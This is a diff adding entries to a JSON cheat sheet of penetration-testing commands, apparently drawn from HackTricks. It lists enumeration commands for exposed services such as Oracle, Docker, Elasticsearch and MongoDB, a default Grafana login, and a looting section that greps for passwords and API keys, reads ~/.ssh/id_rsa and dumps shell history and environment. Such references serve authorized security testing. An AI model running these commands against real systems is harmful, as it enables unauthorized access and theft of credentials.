+    {
+      "id": "e65",
+      "phase": "enum",
+      "category": "Oracle DB",
+      "title": "Enumerate (odat)",
+      "cmd": "odat all -s {{IP}}",
+      "note": "SID guessing, cred checks and privilege enumeration for Oracle.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        1521
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/"
+      }
+    },
+    {
+      "id": "e66",
+      "phase": "lateral",
+      "category": "Docker API",
+      "title": "Exposed daemon",
+      "cmd": "docker -H {{IP}}:2375 ps",
+      "note": "An open Docker socket is usually root on the host.",
+      "tags": [
+        "linux"
+      ],
+      "ports": [
+        2375
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html"
+      }
+    },
+    {
+      "id": "e67",
+      "phase": "enum",
+      "category": "Grafana",
+      "title": "Default login",
+      "cmd": "# browse http://{{IP}}:3000  (admin / admin)",
+      "note": "Try default creds; check the version for known CVEs.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        3000
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/3000-pentesting-grafana.html"
+      }
+    },
+    {
+      "id": "e68",
+      "phase": "enum",
+      "category": "VNC",
+      "title": "Connect",
+      "cmd": "vncviewer {{IP}}:5900",
+      "note": "Often weak / no auth; hydra -s 5900 for brute.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        5900
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html"
+      }
+    },
+    {
+      "id": "e69",
+      "phase": "enum",
+      "category": "Splunk",
+      "title": "Management API",
+      "cmd": "curl -sk https://{{IP}}:8089/services/server/info -u {{USER}}:{{PASS}}",
+      "note": "Splunkd REST API; check the version and default creds.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        8089
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/8089-splunkd.html"
+      }
+    },
+    {
+      "id": "e70",
+      "phase": "enum",
+      "category": "Elasticsearch",
+      "title": "List indices",
+      "cmd": "curl http://{{IP}}:9200/_cat/indices",
+      "note": "Unauthenticated ES exposes all stored data.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        9200
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/9200-pentesting-elasticsearch.html"
+      }
+    },
+    {
+      "id": "e71",
+      "phase": "enum",
+      "category": "Webmin",
+      "title": "Login page",
+      "cmd": "# browse https://{{IP}}:10000",
+      "note": "Check the version for well-known Webmin CVEs.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        10000
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/"
+      }
+    },
+    {
+      "id": "e72",
+      "phase": "enum",
+      "category": "Memcached",
+      "title": "Dump stats",
+      "cmd": "nc {{IP}} 11211   # then: stats",
+      "note": "Unauth memcached can leak cached data.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        11211
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/11211-memcache/"
+      }
+    },
+    {
+      "id": "e73",
+      "phase": "enum",
+      "category": "MongoDB",
+      "title": "Connect",
+      "cmd": "mongosh mongodb://{{IP}}:27017",
+      "note": "No-auth Mongo exposes every database.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        27017
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html"
+      }
+    },
+    {
+      "id": "e74",
+      "phase": "post",
+      "category": "Looting",
+      "title": "Hunt for credentials",
+      "cmd": "grep -rniE 'password|secret|api[_-]?key' . 2>/dev/null",
+      "note": "Config files, histories and source often hold reusable creds.",
+      "tags": [
+        "linux",
+        "windows"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
+      }
+    },
+    {
+      "id": "e75",
+      "phase": "post",
+      "category": "Looting",
+      "title": "Reusable SSH keys",
+      "cmd": "cat ~/.ssh/id_rsa",
+      "note": "Private keys let you move laterally to other hosts.",
+      "tags": [
+        "linux"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html"
+      }
+    },
+    {
+      "id": "e76",
+      "phase": "post",
+      "category": "Looting",
+      "title": "History & environment",
+      "cmd": "history; env",
+      "note": "Commands and variables sometimes expose passwords or tokens.",
+      "tags": [
+        "any"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
+      }
+    }
+  ]
+}
